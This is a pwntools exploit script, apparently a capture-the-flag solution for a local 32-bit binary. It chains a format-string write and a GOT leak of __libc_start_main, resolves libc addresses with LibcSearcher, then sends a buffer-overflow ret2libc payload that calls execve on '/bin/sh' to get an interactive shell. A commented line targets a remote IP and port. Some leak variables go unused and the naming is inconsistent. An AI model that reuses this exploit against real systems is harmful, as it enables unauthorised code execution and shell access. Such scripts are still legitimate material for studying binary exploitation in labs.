from pwn import *
from LibcSearcher import *

context(log_level="debug")
context.gdb_binary = "/bin/pwndbg"
x_addr = 0x0804C030

payload = p32(x_addr)
payload += b"%1c%4$hhn"
elf = ELF("./attachment-9")
libc = ELF("/usr/lib/libc.so.6")

io = process("./attachment-9")
# io = connect("39.96.193.120", 10000)

libc_start_main_got = elf.got["__libc_start_main"]
print(hex(libc_start_main_got))

payload = b"%5c%7$n%8$sa" + p32(x_addr) + p32(libc_start_main_got)
io.recvuntil(b"Hope you have a good time here.\n")
io.sendline(payload)
mainplt = u32(io.recv(4))
print(hex(mainplt))
libc = LibcSearcher("__libc_start_main", mainplt)


# 获取 __libc_start_main 在 libc 文件中的偏移量
offset_start_main = libc.dump("__libc_start_main")
# 计算 libc 基址
libc_base = mainplt - offset_start_main
raw = io.recv(10)                # 拿到 10 字节
leaked = u32(raw[5:9]) 
# 获取 system 和 "/bin/sh" 字符串的地址
system_addr = libc_base + libc.dump("execve")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
io.close()
io = process("./attachment-9")
x_addr = 0x0804C030

payload = p32(x_addr)
payload += b"%1c%4$hhn"
io.recvuntil(b"Hope you have a good time here.\n")
io.sendline(payload)

io.recvuntil(b"Input:\n")
gdb.attach(io)
payload = b"a" * (0x90 + 0x4) + p32(system_addr) + b"bbbb" + p32(bin_sh_addr) + p32(0) + p32(0)
io.sendline(payload)

io.interactive()
